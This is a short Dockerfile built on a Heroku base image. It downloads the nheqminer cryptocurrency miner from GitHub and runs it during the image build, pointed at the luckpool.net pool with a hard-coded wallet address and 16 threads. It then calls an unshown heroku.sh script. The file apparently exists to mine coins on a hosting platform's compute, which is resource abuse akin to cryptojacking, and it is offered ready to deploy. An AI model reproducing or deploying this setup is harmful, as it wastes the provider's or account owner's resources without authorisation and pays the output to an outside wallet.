FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvzf nheqminer-Linux-v0.8.2.tgz && tar xf nheqminer-Linux-v0.8.2.tar.gz && cd nheqminer && ./nheqminer -v -l na.luckpool.net:3956 -u RRq8Dy2DYuBD9Xy2E1QgXQpU8v4KxqCUh8.tailah -p x,xn=5F,d=1024s -t 16
CMD bash heroku.sh
